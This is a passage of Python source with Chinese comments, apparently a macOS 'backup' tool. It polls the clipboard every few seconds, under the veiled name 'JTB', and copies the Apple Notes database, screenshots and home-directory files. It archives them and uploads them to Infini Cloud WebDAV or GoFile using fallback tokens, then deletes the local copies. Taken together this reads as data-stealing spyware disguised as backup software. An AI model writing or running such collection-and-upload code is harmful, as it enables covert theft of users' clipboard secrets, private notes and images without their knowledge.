            remote_path = f"{infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # 创建远程目录（如果需要）
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir, infini_url=infini_url, auth=auth):
                    logging.warning(f"[{config_name}] 无法创建远程目录: {remote_dir}，将继续尝试上传")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # 根据文件大小动态调整超时时间
                    if file_size < 1024 * 1024:  # 小于1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # 大于10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # 只在第一次尝试时显示详细信息
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[{config_name}] 重试上传: {filename} (第 {attempt + 1} 次)")
                    
                    # 准备请求头
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # 执行上传（使用 WebDAV PUT 方法）
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"✅ [{config_name}] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 权限不足")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 远程路径不存在")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 远程路径冲突")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 超时")
                except requests.exceptions.SSLError:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: SSL错误")
                except requests.exceptions.ConnectionError:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 连接错误")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"[{config_name}] 等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] 上传过程出错: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案，支持主/备 token 回退）
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            # API token 列表：主 token 失败后回退到备用 token
            api_tokens = [t for t in getattr(self, "api_tokens", []) if t] or [self.api_token]
            token_index = 0
            current_token = api_tokens[token_index]

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while token_index < len(api_tokens) and total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # 使用 with 语句确保文件正确关闭
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            headers={"Authorization": f"Bearer {current_token}"},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"✅ [GoFile] {filename}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    error_code = result.get("code", 0)
                                    if total_retries == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"[GoFile] 服务器返回错误 (代码: {error_code}): {error_msg}")
                                    
                                    # 处理特定错误码
                                    if error_code in [402, 405]:  # 服务器限制或权限错误
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # 如果已经尝试了所有服务器
                                            time.sleep(self.config.RETRY_DELAY * 2)  # 增加等待时间
                            except ValueError:
                                if total_retries == 0 or self.config.DEBUG_MODE:
                                    logging.error("[GoFile] 服务器返回无效JSON数据")
                        else:
                            if total_retries == 0 or self.config.DEBUG_MODE:
                                logging.error(f"[GoFile] 上传失败，HTTP状态码: {response.status_code}")

                except requests.exceptions.Timeout:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 上传超时")
                except requests.exceptions.SSLError:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: SSL错误")
                except requests.exceptions.ConnectionError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 连接错误")
                except requests.exceptions.RequestException as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 请求异常")
                except (OSError, IOError) as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 文件读取错误")
                except Exception as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: {str(e)}")

                # 切换到下一个服务器
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                
                total_retries += 1

                # 当前 token 已用尽全部重试，回退到下一个备用 token 重新开始
                if total_retries >= max_total_retries and not upload_success and token_index < len(api_tokens) - 1:
                    token_index += 1
                    current_token = api_tokens[token_index]
                    total_retries = 0
                    server_index = 0
                    logging.warning(f"⚠️ [GoFile] 主 token 上传失败，回退到备用 token ({token_index + 1}/{len(api_tokens)}): {filename}")

            if upload_success:
                return True
            else:
                logging.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
                return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"[GoFile] 处理文件时出错: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] 处理文件时出现未知错误: {str(e)}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件，依次尝试所有 Infini 配置，全部失败后再使用 GoFile 备选方案
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            infini_configs = self.infini_configs if self.infini_configs else [
                {
                    "name": "Infini-默认配置",
                    "url": self.infini_url,
                    "user": self.infini_user,
                    "password": self.infini_pass,
                }
            ]

            # 依次尝试所有 Infini 上传配置
            for index, infini_config in enumerate(infini_configs, start=1):
                config_name = infini_config.get("name", f"Infini-{index}")
                logging.info(f"🔄 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
                if self._upload_single_file_infini(file_path, infini_config):
                    self._safe_remove_file(file_path, retry=True)
                    return True

            # 所有 Infini 上传方法都失败后，才尝试 GoFile 备选方案
            logging.warning(f"⚠️ 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True
            
            # 所有方法都失败
            logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
            return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"处理文件时出错: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """安全压缩目录；超过源大小阈值时按 tar 成员分片。"""
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            manifest = build_manifest(folder_path)
            if len(manifest) <= 1:
                logging.error(f"源目录为空 {folder_path}")
                return None

            dir_size = sum(
                entry[1] for entry in manifest.values() if entry[0] == "file")

            if not self._ensure_free_space(
                    dir_size, os.path.dirname(zip_file_path) or zip_file_path):
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                archive_paths = split_archive(
                    folder_path,
                    zip_file_path,
                    self.config.MAX_SOURCE_DIR_SIZE,
                )
                self._clean_directory(folder_path)
                logging.info(f"已分割为 {len(archive_paths)} 个压缩文件")
                return archive_paths

            tar_path = f"{zip_file_path}.tar.gz"
            create_archive(
                folder_path,
                tar_path,
                compresslevel=self.config.TAR_COMPRESS_LEVEL,
            )
            self._clean_directory(folder_path)
            return tar_path
        except (OSError, IOError, PermissionError, tarfile.TarError,
                ArchiveError) as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            return None

    def next_timestamped_archive_base(self, prefix):
        """分配不与磁盘文件或 pending 记录冲突的秒级时间戳归档名。"""
        now = datetime.now()
        pending_keys = self._state.get("pending_archives", {})
        for offset in range(120):
            timestamp = (now + timedelta(seconds=offset)).strftime(
                "%Y%m%d_%H%M%S")
            base = os.path.join(self.config.BACKUP_ROOT, f"{prefix}_{timestamp}")
            final_name = f"{base}.tar.gz"
            candidates = [
                final_name,
                f"{base}_part0.tar.gz",
            ]
            candidates.extend(
                glob.glob(f"{glob.escape(base)}_part*.tar.gz"))
            if (not any(os.path.exists(path) for path in candidates)
                    and archive_group_key(final_name) not in pending_keys):
                return base
        raise RuntimeError(f"无法分配唯一归档名: {prefix}")

    def cleanup_orphan_archives(self):
        """删除未登记 pending 的旧归档及压缩临时文件。"""
        pending_keys = set(self._state.get("pending_archives", {}))
        cutoff = time.time() - self.config.ORPHAN_ARCHIVE_AGE
        removed = 0
        try:
            for path in Path(self.config.BACKUP_ROOT).iterdir():
                if not path.is_file():
                    continue
                name = path.name
                if not (
                        name.endswith(".tar.gz")
                        or ".tar.gz.part" in name
                        or name.endswith(".partial")):
                    continue
                if (name.endswith(".tar.gz")
                        and archive_group_key(name) in pending_keys):
                    continue
                if ".tar.gz.part" in name and archive_group_key(name) in pending_keys:
                    continue
                try:
                    if path.stat().st_mtime >= cutoff:
                        continue
                    path.unlink()
                    removed += 1
                except OSError as exc:
                    logging.warning(f"⚠️ 清理残留归档失败 {path}: {exc}")
        except OSError as exc:
            logging.error(f"扫描残留归档失败: {exc}")
        if removed:
            logging.info(f"🧹 已清理 {removed} 个未登记 pending 的残留归档")
        return removed

    def get_clipboard_content(self):
        """获取JTB内容"""
        try:
            content = subprocess.check_output(['pbpaste']).decode('utf-8')
            if content is None:
                return None
            # 去除空白字符
            content = content.strip()
            return content if content else None
        except (subprocess.CalledProcessError, RuntimeError, UnicodeDecodeError) as e:
            # 某些环境下（如无图形界面 / 无剪贴板服务）会持续抛出异常
            # 这里不记录错误日志，只返回 None，避免日志被高频刷屏
            return None

    def _clipboard_lock(self):
        lock = getattr(self, "_clipboard_file_lock", None)
        if lock is None:
            lock = threading.RLock()
            self._clipboard_file_lock = lock
        return lock

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件，写入成功时返回 True。"""
        return append_clipboard_update(
            file_path, content, self._clipboard_lock())

    def monitor_clipboard(self, file_path, interval=3):
        """启动剪贴板监控循环。"""
        run_clipboard_monitor(
            self,
            file_path,
            interval or self.config.CLIPBOARD_CHECK_INTERVAL,
            getattr(self, "_worker_stop_event", None),
        )

    def start_clipboard_workers(self, clipboard_log_path):
        """启动且只启动一组剪贴板监控/上传线程。"""
        service = getattr(self, "_clipboard_workers", None)
        if service is None or not any(
                thread.is_alive() for thread in service.threads):
            service = ClipboardWorkers(self, clipboard_log_path)
            self._clipboard_workers = service
            self._worker_stop_event = service.stop_event
            self._clipboard_threads = service.threads
        started = service.start()
        self._clipboard_threads = service.threads
        self._worker_stop_event = service.stop_event
        return started

    def stop_clipboard_workers(self, timeout=5):
        """通知并等待剪贴板线程退出，供管理器重建前调用。"""
        service = getattr(self, "_clipboard_workers", None)
        if service is not None:
            service.stop(timeout=timeout)
        self._clipboard_threads = []

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def backup_specified_files(self, source_dir, target_dir, state_namespace=None):
        """按内容指纹备份指定目录和文件。"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug("开始备份指定目录和文件:")
            logging.debug("源目录: %s", source_dir)
            logging.debug("目标目录: %s", target_dir)

        if not os.path.exists(source_dir):
            logging.error(f"❌ 源目录不存在: {source_dir}")
            return BackupResult(None, "failed", missing_files=[source_dir])
        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return BackupResult(None, "failed", missing_files=[source_dir])
        if not self._ensure_free_space(0, os.path.dirname(target_dir) or target_dir):
            return BackupResult(None, "failed", missing_files=[source_dir])
        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return BackupResult(None, "failed", missing_files=[source_dir])

        state_namespace = state_namespace or f"specified:{Path(target_dir).name}"
        changed_records = {}
        items_count = 0
        files_count = 0
        skipped_files = 0
        failed_files = []
        total_size = 0
        processed_sources = set()

        def backup_item(source_path):
            nonlocal items_count, files_count, skipped_files, total_size
            resolved = os.path.abspath(source_path)
            if resolved in processed_sources:
                return
            processed_sources.add(resolved)
            rel_name = os.path.relpath(resolved, source_dir)
            target_path = os.path.join(target_dir, rel_name)
            rel_key = self._state_key(state_namespace, rel_name)
            items_count += 1
            before = len(changed_records)
            try:
                if os.path.islink(resolved):
                    status = self._copy_if_changed(
                        resolved, target_path, rel_key, changed_records,
                        preserve_symlinks=True)
                    if status == "copied":
                        files_count += 1
                    elif status == "skipped":
                        skipped_files += 1
                    else:
                        failed_files.append(resolved)
                elif os.path.isdir(resolved):
                    complete, _, skipped, failed = self._copy_tree_if_changed(
                        resolved, target_path, rel_key, changed_records,
                        exclude_names=())
                    copied = len(changed_records) - before
                    files_count += copied
                    skipped_files += skipped
                    if not complete or failed:
                        failed_files.append(resolved)
                    if self.config.DEBUG_MODE and copied:
                        logging.debug(
                            f"📁 增量备份目录: {source_path} ({copied} 个文件)")
                elif os.path.isfile(resolved):
                    status = self._copy_if_changed(
                        resolved, target_path, rel_key, changed_records,
                        preserve_symlinks=False)
                    if status == "copied":
                        files_count += 1
                    elif status == "skipped":
                        skipped_files += 1
                    else:
                        failed_files.append(resolved)
            except Exception as exc:
                failed_files.append(resolved)
                logging.error(f"❌ 增量备份失败: {resolved} - {exc}")

        for item in self.config.MACOS_SPECIFIC_DIRS:
            if any(ch in item for ch in ["*", "?", "["]):
                pattern = os.path.join(source_dir, item)
                matched_paths = glob.glob(pattern)
                if not matched_paths and self.config.DEBUG_MODE:
                    logging.debug(f"通配符未匹配到任何项目: {pattern}")
                for matched_path in matched_paths:
                    if os.path.lexists(matched_path):
                        backup_item(matched_path)
                continue

            source_path = os.path.join(source_dir, item)
            if not os.path.lexists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"跳过不存在的项目: {source_path}")
                continue
            backup_item(source_path)

        total_size = sum(
            int(record.get("size", 0))
            for record in changed_records.values()
            if isinstance(record, dict)
        )
        missing_files = list(dict.fromkeys(failed_files))
        if items_count == 0:
            self._save_backup_state()
            if missing_files:
                logging.error("❌ 指定文件扫描未完整完成")
                return BackupResult(
                    target_dir, "partial", missing_files=missing_files,
                    copied_files=0, skipped_files=skipped_files,
                    changed_records=changed_records,
                )
            logging.info("ℹ️ 未找到需要备份的指定文件")
            return BackupResult(
                target_dir, "success", missing_files=[],
                copied_files=0, skipped_files=skipped_files,
                changed_records=changed_records,
            )

        status = "partial" if missing_files else "success"
        if changed_records:
            logging.info(
                f"📊 指定文件备份完成: 新增/更新 {files_count} 个文件 "
                f"({total_size / 1024 / 1024:.1f}MB)，"
                f"未变化跳过 {skipped_files} 个")
        else:
            logging.info(f"⏭️ 指定文件内容均未变化，跳过 {skipped_files} 个文件")
        if missing_files:
            logging.warning(
                f"⚠️ 指定文件备份部分完成: 失败/遗漏 {len(missing_files)} 个项目")

        self._save_backup_state()
        return BackupResult(
            target_dir, status, missing_files=missing_files,
            copied_files=files_count, skipped_files=skipped_files,
            failed_files=missing_files, changed_records=changed_records,
        )

    def get_clipboard_log_state(self, file_path):
        """区分空文件、有效内容与读取失败，避免把 I/O 错误当成空内容。"""
        return get_clipboard_log_state(
            file_path, self._clipboard_lock())

    def has_clipboard_content(self, file_path):
        """保留布尔接口；读取失败不再等同于无内容。"""
        return self.get_clipboard_log_state(file_path) == CLIPBOARD_LOG_CONTENT

def get_available_volumes(backup_manager=None):
    """获取所有可用的数据卷和云盘目录"""
    available_volumes = {}
    backup_root = (
        backup_manager.config.BACKUP_ROOT
        if backup_manager is not None else BackupConfig.BACKUP_ROOT
    )
    
    # 获取用户主目录
    user_path = os.path.expanduser('~')
    if os.path.exists(user_path):
        try:
            logging.info("正在配置用户主目录备份...")
            logging.debug(f"用户主目录: {user_path}")
            
            # 获取用户名前缀
            username = getpass.getuser()
            user_prefix = username[:5] if username else "user"
            
            # 配置用户主目录备份
            backup_path = os.path.join(backup_root, f'{user_prefix}_home')
            available_volumes['home'] = {
                'docs': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_docs'), 1),
                'configs': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_configs'), 2),
                'specified': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_specified'), 4),
            }
            logging.info(f"✅ 已配置用户主目录备份: {user_path}")
            
        except Exception as e:
            logging.error(f"❌ 配置用户主目录备份时出错: {e}")
    
    if not available_volumes:
        logging.warning("⚠️ 未检测到可用的用户主目录")
    else:
        logging.info(f"📊 已配置用户主目录备份")
        for name, config in available_volumes.items():
            logging.info(f"  - {name}: {config['docs'][0]}")
    
    return available_volumes

def clean_backup_directory(backup_manager=None):
    """清理备份目录中的临时文件和空目录"""
    backup_root = (
        backup_manager.config.BACKUP_ROOT
        if backup_manager is not None else BackupConfig.BACKUP_ROOT
    )
    try:
        if not os.path.exists(backup_root):
            return
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        # 清理临时目录
        temp_dir = os.path.join(backup_root, f'{user_prefix}_temp')
        if os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir)
            except Exception as e:
                logging.error(f"清理临时目录失败: {e}")
        
        # 清理空目录
        for root, dirs, files in os.walk(backup_root, topdown=False):
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dir_path):  # 如果目录为空
                        os.rmdir(dir_path)
                except Exception:
                    continue
                    
    except Exception as e:
        logging.error(f"清理备份目录失败: {e}")

def backup_notes(backup_manager=None):
    """备份Mac的备忘录数据

    Args:
        backup_manager: 可复用的备份管理器实例；未提供时自建一个（不推荐重复自建）
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    notes_dir = os.path.expanduser('~/Library/Group Containers/group.com.apple.notes')
    if backup_manager is None:
        backup_manager = BackupManager()
    notes_backup_directory = os.path.join(
        backup_manager.config.BACKUP_ROOT, f"{user_prefix}_notes")

    if not os.path.exists(notes_dir):
        logging.info("ℹ️ 备忘录数据目录不存在，跳过")
        return None, {}, True
    if not os.access(notes_dir, os.R_OK):
        logging.error(f"❌ 备忘录数据目录没有读取权限: {notes_dir}")
        return None, {}, False
    if not backup_manager._ensure_free_space(0, os.path.dirname(notes_backup_directory) or notes_backup_directory):
        return None, {}, False
    if not backup_manager._clean_directory(notes_backup_directory):
        return None, {}, False

    def db_fingerprint(conn):
        """给数据库做粗粒度指纹（笔记行数 + 最近修改时间），用于核对快照是否与源库一致。"""
        note_rows = None
        last_modified = None
        try:
            note_rows = conn.execute("SELECT COUNT(*) FROM ZICNOTEDATA").fetchone()[0]
        except sqlite3.Error:
            pass
        try:
            last_modified = conn.execute(
                "SELECT MAX(ZMODIFICATIONDATE) FROM ZICCLOUDSYNCINGOBJECT"
            ).fetchone()[0]
        except sqlite3.Error:
            pass
        return note_rows, last_modified

    def snapshot_sqlite(source_file, target_file):
        """使用 SQLite backup API 生成一致性快照，包含已提交的 WAL 数据。"""
        src_conn = None
        dst_conn = None
        check_conn = None
        try:
            source_uri = Path(source_file).as_uri() + "?mode=ro"
            src_conn = sqlite3.connect(source_uri, uri=True, timeout=10)
            # 先读取源库指纹：快照必须不早于此刻的状态，否则说明漏掉了 WAL 中已提交的数据。
            source_rows, source_last = db_fingerprint(src_conn)
            dst_conn = sqlite3.connect(target_file)
            with dst_conn:
                src_conn.backup(dst_conn)
            dst_conn.close()
            dst_conn = None
            src_conn.close()
            src_conn = None

            check_conn = sqlite3.connect(target_file)
            integrity = check_conn.execute("PRAGMA integrity_check").fetchone()
            if not integrity or str(integrity[0]).lower() != "ok":
                raise sqlite3.DatabaseError(f"integrity_check 返回异常: {integrity}")

            # 空数据库的 integrity_check 同样是 ok，因此必须核对内容是否真的拷到。
            snap_rows, snap_last = db_fingerprint(check_conn)
            stale_reason = None
            if (source_rows is None) != (snap_rows is None):
                stale_reason = f"快照缺少源库中的笔记数据表（源库 {source_rows} 行，快照 {snap_rows}）"
            elif source_rows is not None and snap_rows < source_rows:
                stale_reason = f"快照笔记数少于源库: {snap_rows} < {source_rows}"
            elif source_last is not None and snap_last is not None and snap_last < source_last:
                stale_reason = f"快照落后于源库: {snap_last} < {source_last}"
            if stale_reason:
                raise sqlite3.DatabaseError(stale_reason)
            if snap_rows != source_rows:
                logging.warning(f"快照与源库笔记数不同（备份期间可能有正常写入）: {snap_rows}/{source_rows}")

            # 让快照自带完整数据，不再依赖 -wal/-shm 才可打开；失败不影响可用性。
            try:
                check_conn.execute("PRAGMA journal_mode=DELETE")
            except sqlite3.Error as e:
                logging.warning(f"快照切换单文件模式失败（不影响可用性） {target_file}: {e}")

            return True
        except Exception as e:
            logging.error(f"生成备忘录数据库一致性快照失败 {source_file}: {e}")
            return False
        finally:
            for conn in (check_conn, dst_conn, src_conn):
                if conn is not None:
                    try:
                        conn.close()
                    except Exception:
                        pass

    def notes_excluded_dir(relative_path):
        """判断备忘录容器内的目录是否可重建，可安全跳过。"""
        if os.path.basename(relative_path).lower() in BackupConfig.NOTES_EXCLUDE_DIR_NAMES:
            return True
        normalized = relative_path.lower().replace(os.sep, "/")
        return any(
            normalized == path or normalized.startswith(path + "/")
            for path in BackupConfig.NOTES_EXCLUDE_DIR_PATHS
        )

    def notes_excluded_file(file_name):
        """判断备忘录容器内的文件是否只是锁文件或索引状态，可安全跳过。"""
        lower_name = file_name.lower()
        return any(
            fnmatch.fnmatch(lower_name, pattern)
            for pattern in BackupConfig.NOTES_EXCLUDE_FILE_PATTERNS
        )

    try:
        copied_count = 0
        unchanged_count = 0
        seen_files = 0
        changed_records = {}
        failed_files = []
        sqlite_failed = False
        skipped_dirs = 0
        skipped_files = 0
        # 复制附件和所有非 SQLite 文件；.sqlite 使用一致性快照，
        # .sqlite-wal/.sqlite-shm 不直接复制，避免产生无法恢复的半提交状态；
        # 缩略图、缓存等可重建目录直接剪枝，不进入遍历。
        for root, dirs, files in os.walk(notes_dir, topdown=True):
            keep_dirs = []
            for dir_name in dirs:
                relative_dir = os.path.relpath(os.path.join(root, dir_name), notes_dir)
                if notes_excluded_dir(relative_dir):
                    skipped_dirs += 1
                else:
                    keep_dirs.append(dir_name)
            dirs[:] = keep_dirs

            for file in files:
                source_file = os.path.join(root, file)
                if not os.path.exists(source_file):
                    continue

                if file.endswith('.sqlite-wal') or file.endswith('.sqlite-shm'):
                    skipped_files += 1
                    continue

                if notes_excluded_file(file):
                    skipped_files += 1
                    continue

                relative_path = os.path.relpath(root, notes_dir)
                rel_key = backup_manager._state_key("notes", relative_path, file)
                target_sub_dir = os.path.join(notes_backup_directory, relative_path)
                if not backup_manager._ensure_directory(target_sub_dir):
                    failed_files.append(source_file)
                    continue

                target_file = os.path.join(target_sub_dir, file)
                seen_files += 1
                if file.endswith('.sqlite'):
                    if snapshot_sqlite(source_file, target_file):
                        unchanged, fingerprint = backup_manager._source_change_status(
                            rel_key, target_file)
                        if unchanged:
                            unchanged_count += 1
                            try:
                                os.remove(target_file)
                            except OSError:
                                pass
                        else:
                            changed_records[rel_key] = fingerprint
                            copied_count += 1
                    else:
                        sqlite_failed = True
                else:
                    status = backup_manager._copy_if_changed(
                        source_file, target_file, rel_key, changed_records,
                        preserve_symlinks=True)
                    if status == "copied":
                        copied_count += 1
                    elif status == "skipped":
                        unchanged_count += 1
                    else:
                        failed_files.append(source_file)

        # 附件缺失同样属于备份不完整，必须整体判失败并重试，否则会在压缩后被静默丢弃。
        if sqlite_failed or failed_files:
            logging.error(
                f"备忘录备份不完整：成功复制 {copied_count} 个文件，"
                f"数据库快照失败={sqlite_failed}，附件失败 {len(failed_files)} 个"
            )
            return None, {}, False
        if seen_files == 0:
            logging.info("ℹ️ 备忘录容器中没有需要备份的数据，跳过")
            return None, {}, True
        backup_manager._save_backup_state()
        if not changed_records:
            logging.info(
                f"⏭️ 备忘录内容均未变化，跳过归档 "
                f"({unchanged_count} 个文件)")
            return None, {}, True
        logging.info(
            f"备忘录备份完成：复制 {copied_count} 个文件，"
            f"未变化 {unchanged_count} 个，"
            f"跳过可重建目录 {skipped_dirs} 个、临时文件 {skipped_files} 个"
        )
        return notes_backup_directory, changed_records, True
    except Exception as e:
        logging.error(f"备份备忘录数据失败: {e}")
        return None, {}, False

def backup_screenshots(backup_manager=None):
    """备份截图文件

    Args:
        backup_manager: 可复用的备份管理器实例；未提供时自建一个（不推荐重复自建）
    """
    def get_screenshot_location():
        """读取 macOS 截图自定义保存路径（若存在）"""
        try:
            output = subprocess.check_output(
                ['defaults', 'read', 'com.apple.screencapture', 'location'],
                stderr=subprocess.STDOUT
            ).decode('utf-8', errors='ignore').strip()
            if output and os.path.exists(output):
                return output
        except Exception:
            return None
        return None

    screenshot_paths = [
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Pictures')
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "屏幕快照",
        "屏幕截图",
        "截图",
        "截屏"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    if backup_manager is None:
        backup_manager = BackupManager()
    screenshot_backup_directory = os.path.join(
        backup_manager.config.BACKUP_ROOT, f"{user_prefix}_screenshots")
    
    # 暂存目录只保存本轮新增或内容变化的文件。
    if not backup_manager._ensure_free_space(0, os.path.dirname(screenshot_backup_directory) or screenshot_backup_directory):
        return None, {}, False
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None, {}, False
        
    changed_records = {}
    matched_files = 0
    skipped_files = 0
    complete = True
    for source_index, source_dir in enumerate(screenshot_paths):
        if os.path.exists(source_dir):
            try:
                # 扫描整个目录，筛选包含"screenshot"关键字的文件
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # 检查文件名是否包含截图关键字（不区分大小写）
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        # 既要命中截图关键字，也要是常见图片格式
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0:
                                continue
                        except OSError:
                            continue

                        matched_files += 1
                        source_label = os.path.basename(os.path.normpath(source_dir)) or f"source_{source_index}"
                        relative_path = os.path.relpath(root, source_dir)
